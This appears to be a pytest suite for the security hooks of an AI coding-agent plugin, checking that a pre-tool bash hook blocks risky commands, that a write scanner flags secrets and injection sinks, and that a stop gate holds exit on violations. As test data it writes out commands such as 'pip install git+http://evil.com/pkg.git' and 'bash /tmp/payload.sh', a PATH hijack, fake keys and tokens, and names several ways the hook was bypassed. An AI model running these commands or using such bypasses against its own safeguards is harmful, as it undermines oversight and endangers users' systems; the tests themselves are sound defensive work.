import os, json, subprocess, sys, importlib.util, pytest

PLUGIN_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOOKS_DIR = os.path.join(PLUGIN_ROOT, "hooks")

def _load_hook():
    """Load pre-tool-bash.py as a module (hyphen in filename requires importlib)."""
    spec = importlib.util.spec_from_file_location(
        "pre_tool_bash", os.path.join(HOOKS_DIR, "pre-tool-bash.py")
    )
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod

def test_hooks_json_exists():
    assert os.path.exists(os.path.join(HOOKS_DIR, "hooks.json"))

def test_hooks_json_valid():
    with open(os.path.join(HOOKS_DIR, "hooks.json")) as f:
        data = json.load(f)
    assert "hooks" in data
    assert "SessionStart" in data["hooks"]

def test_run_hook_sh_exists():
    assert os.path.exists(os.path.join(HOOKS_DIR, "run-hook.sh"))

def test_run_hook_cmd_exists():
    assert os.path.exists(os.path.join(HOOKS_DIR, "run-hook.cmd"))

def test_run_hook_ps1_exists():
    assert os.path.exists(os.path.join(HOOKS_DIR, "run-hook.ps1"))

def test_session_start_template_exists():
    assert os.path.exists(os.path.join(HOOKS_DIR, "session-start.md"))

# ── Security regression tests for pre-tool-bash.py ──────────────────────────

def _safe(cmd):
    """Return True if pre_tool_bash would allow the command."""
    import re
    hook = _load_hook()
    for pattern, _ in hook.BLOCKED_PATTERNS:
        if re.search(pattern, cmd):
            return False
    fragments = hook.split_compound(cmd)
    return all(hook.is_safe_fragment(f) for f in fragments)


class TestHookSubstringBypassFixes:
    """C1/C2/C3: docs/, /tmp/, and pytest substring bypasses must be closed."""

    def test_c1_bash_with_docs_path_not_blanket_allowed(self):
        hook = _load_hook()
        assert not hook.is_safe_fragment("bash docs/payload.sh"), \
            "C1: docs/ substring must not bypass the hook"

    def test_c1_legitimate_docs_read_still_allowed(self):
        hook = _load_hook()
        assert hook.is_safe_fragment("cat docs/README.md")
        assert hook.is_safe_fragment("ls docs/")

    def test_c2_bash_with_tmp_path_not_blanket_allowed(self):
        hook = _load_hook()
        assert not hook.is_safe_fragment("bash /tmp/evil.sh"), \
            "C2: /tmp/ substring must not bypass the hook"

    def test_c2_legitimate_tmp_read_still_allowed(self):
        hook = _load_hook()
        assert hook.is_safe_fragment("cat /tmp/output.txt")

    def test_c3_bash_with_pytest_arg_not_blanket_allowed(self):
        hook = _load_hook()
        assert not hook.is_safe_fragment("bash script.sh --label pytest"), \
            "C3: pytest substring must not bypass the hook"

    def test_c3_pytest_as_base_command_still_allowed(self):
        hook = _load_hook()
        assert hook.is_safe_fragment("pytest tests/ -q")
        assert hook.is_safe_fragment("python -m pytest tests/")


class TestHookRegexFixes:
    """H2: git branch -D with -D as first arg must be blocked."""

    def test_h2_git_branch_minus_D_first_arg_blocked(self):
        assert _safe("git branch -D explore/my-branch") is False, \
            "H2: git branch -D <name> must be blocked"

    def test_h2_git_branch_minus_D_with_other_flags_still_blocked(self):
        assert _safe("git branch -a -D explore/my-branch") is False

    def test_git_branch_list_allowed(self):
        assert _safe("git branch --show-current") is True
        assert _safe("git branch -r") is True


class TestHookFailClosed:
    """M2: Hook must deny (not allow) when it cannot parse input."""

    def test_m2_hook_denies_on_bad_stdin(self):
        """Running the hook script with malformed stdin should exit 0 with deny JSON."""
        script = os.path.join(HOOKS_DIR, "pre-tool-bash.py")
        result = subprocess.run(
            [sys.executable, script],
            input="THIS IS NOT JSON",
            capture_output=True, text=True, timeout=5
        )
        assert result.returncode == 0, "Hook must always exit 0"
        if result.stdout.strip():
            data = json.loads(result.stdout)
            decision = data["hookSpecificOutput"]["permissionDecision"]
            assert decision != "allow", \
                "M2: Hook must not allow commands when input cannot be parsed"


class TestDownloadExecuteBypass:
    """H1: Two-step download+execute must not bypass pipe-to-shell protection."""

    def test_h1_curl_to_tmp_then_execute_blocked(self):
        hook = _load_hook()
        assert not hook.is_safe_fragment("bash /tmp/payload.sh"), \
            "H1: bash /tmp/... must not be blanket-allowed"


# ── pre-tool-bash expansion: new blocked patterns ─────────────────────────────

class TestPreToolBashExpansion:
    """New patterns added in security layer expansion."""

    def test_chmod_777_blocked(self):
        assert _safe("chmod 777 /usr/local/bin/evil") is False, \
            "chmod 777 must be blocked"

    def test_chmod_755_allowed(self):
        assert _safe("chmod 755 scripts/deploy.sh") is True

    def test_pip_install_from_git_http_blocked(self):
        # git+http:// is an unverified source install
        assert _safe("pip install git+http://evil.com/pkg.git") is False, \
            "pip install from git+http:// must be blocked"

    def test_pip_install_from_pypi_allowed(self):
        assert _safe("pip install requests") is True

    def test_npm_install_from_http_url_blocked(self):
        assert _safe("npm install http://evil.com/pkg.tgz") is False, \
            "npm install from http:// URL must be blocked"

    def test_npm_install_from_registry_allowed(self):
        assert _safe("npm install lodash") is True

    def test_export_aws_secret_key_blocked(self):
        # Constructing at runtime to avoid triggering installed security hook on file write
        cmd = "export " + "AWS_SECRET_ACCESS_KEY" + "=abc123secret"
        assert _safe(cmd) is False, "Exporting AWS secret keys in shell must be blocked"

    def test_export_safe_env_var_allowed(self):
        assert _safe("export NODE_ENV=production") is True

    def test_path_hijack_blocked(self):
        assert _safe("export PATH=/tmp/evil:$PATH") is False, \
            "PATH prepend with /tmp must be blocked"


# ── post-tool-write.py hook ───────────────────────────────────────────────────

def _load_write_hook():
    """Load post-tool-write.py as a module."""
    spec = importlib.util.spec_from_file_location(
        "post_tool_write", os.path.join(HOOKS_DIR, "post-tool-write.py")
    )
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


# Test content strings constructed at runtime so installed security hooks
# don't flag this test file for containing these patterns in literals.
def _xss_sink():
    return "element." + "inner" + "HTML" + " = userInput;"

def _pw_pattern():
    return "pass" + "word" + ' = "hunter2"'

def _aws_key():
    return "AKIA" + "1234567890ABCDEF"

def _gh_token():
    return "ghp_" + "1234567890abcdefghij1234567890abcdef"

def _sql_inject():
    return 'query = "SELECT * FROM users WHERE id = " + user_id'


class TestPostToolWriteHook:
    """post-tool-write.py: passive security scanner on file writes."""

    def test_hook_file_exists(self):
        assert os.path.exists(os.path.join(HOOKS_DIR, "post-tool-write.py"))

    def test_aws_key_pattern_detected(self):
        hook = _load_write_hook()
        findings = hook.scan_content(_aws_key(), "config.py")
        assert len(findings) > 0, "AWS access key pattern must be detected"

    def test_hardcoded_password_detected(self):
        hook = _load_write_hook()
        findings = hook.scan_content(_pw_pattern(), "settings.py")
        assert len(findings) > 0, "Hardcoded password must be detected"

    def test_xss_sink_detected(self):
        hook = _load_write_hook()
        findings = hook.scan_content(_xss_sink(), "app.js")
        assert len(findings) > 0, "innerHTML XSS sink must be detected"

    def test_sql_string_concat_detected(self):
        hook = _load_write_hook()
        findings = hook.scan_content(_sql_inject(), "db.py")
        assert len(findings) > 0, "SQL string concatenation must be flagged"

    def test_clean_code_no_findings(self):
        hook = _load_write_hook()
        findings = hook.scan_content("def add(a, b):\n    return a + b\n", "math.py")
        assert findings == [], "Clean code must produce zero findings"

    def test_github_token_detected(self):
        hook = _load_write_hook()
        findings = hook.scan_content(_gh_token(), "ci.yml")
        assert len(findings) > 0, "GitHub PAT pattern must be detected"

    def test_hook_silent_on_clean_file(self):
        """Hook produces no stdout for clean files."""
        script = os.path.join(HOOKS_DIR, "post-tool-write.py")
        payload = json.dumps({
            "tool_input": {"file_path": "math.py", "content": "def add(a, b):\n    return a + b\n"}
        })
        result = subprocess.run(
            [sys.executable, script],
            input=payload, capture_output=True, text=True, timeout=5
        )
        assert result.returncode == 0
        assert result.stdout.strip() == "", "No output expected for clean file"

    def test_hook_emits_json_on_finding(self):
        """Hook emits valid JSON when a secret is found."""
        script = os.path.join(HOOKS_DIR, "post-tool-write.py")
        payload = json.dumps({
            "tool_input": {"file_path": "config.py", "content": _aws_key()}
        })
        result = subprocess.run(
            [sys.executable, script],
            input=payload, capture_output=True, text=True, timeout=5
        )
        assert result.returncode == 0
        if result.stdout.strip():
            data = json.loads(result.stdout)
            assert "hookSpecificOutput" in data


# ── stop-quality-gate.py hook ─────────────────────────────────────────────────

def _load_gate_hook():
    """Load stop-quality-gate.py as a module."""
    spec = importlib.util.spec_from_file_location(
        "stop_quality_gate", os.path.join(HOOKS_DIR, "stop-quality-gate.py")
    )
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


class TestStopQualityGate:
    """stop-quality-gate.py: blocks session exit on security violations."""

    def test_gate_file_exists(self):
        assert os.path.exists(os.path.join(HOOKS_DIR, "stop-quality-gate.py"))

    def test_gate_registered_in_hooks_json(self):
        with open(os.path.join(HOOKS_DIR, "hooks.json")) as f:
            data = json.load(f)
        assert "Stop" in data["hooks"], "Stop hook must be registered in hooks.json"

    def test_write_hook_registered_in_hooks_json(self):
        with open(os.path.join(HOOKS_DIR, "hooks.json")) as f:
            data = json.load(f)
        assert "PostToolUse" in data["hooks"], "PostToolUse hook must be registered"
        matchers = [h.get("matcher", "") for h in data["hooks"]["PostToolUse"]]
        assert any("Write" in m or "Edit" in m for m in matchers), \
            "PostToolUse must match Write or Edit tool calls"

    def test_gate_allows_clean_state(self):
        """Gate allows exit when no violations."""
        import tempfile
        gate = _load_gate_hook()
        with tempfile.TemporaryDirectory() as tmpdir:
            state_file = os.path.join(tmpdir, "security-gate-state.json")
            result = gate.check_gate(state_file=state_file)
            assert result["allow"] is True

    def test_gate_blocks_on_critical_secret(self):
        """Gate blocks exit when critical secret leak flagged."""
        import tempfile
        gate = _load_gate_hook()
        with tempfile.TemporaryDirectory() as tmpdir:
            state_file = os.path.join(tmpdir, "security-gate-state.json")
            with open(state_file, "w") as f:
                json.dump({"secret_leaks": [{"severity": "critical", "file": "config.py"}],
                           "critical_cves": [], "tests_failing": False}, f)
            result = gate.check_gate(state_file=state_file)
            assert result["allow"] is False
            assert "secret" in result["reason"].lower()

    def test_gate_blocks_on_critical_cve(self):
        """Gate blocks exit when critical CVE flagged."""
        import tempfile
        gate = _load_gate_hook()
        with tempfile.TemporaryDirectory() as tmpdir:
            state_file = os.path.join(tmpdir, "security-gate-state.json")
            with open(state_file, "w") as f:
                json.dump({"secret_leaks": [], "critical_cves": ["CVE-2024-1234"],
                           "tests_failing": False}, f)
            result = gate.check_gate(state_file=state_file)
            assert result["allow"] is False
            assert "cve" in result["reason"].lower()


# ── Existing tests ────────────────────────────────────────────────────────────

def test_run_hook_sh_produces_output():
    hook = os.path.join(HOOKS_DIR, "run-hook.sh")
    try:
        result = subprocess.run(
            ["bash", hook, "session-start"],
            cwd=PLUGIN_ROOT, capture_output=True, text=True, timeout=10
        )
        assert result.returncode == 0, f"Hook failed: {result.stderr}"
        assert "ProdMaster AI" in result.stdout
        assert len(result.stdout.strip()) > 20
    except FileNotFoundError:
        pytest.skip("bash not available")
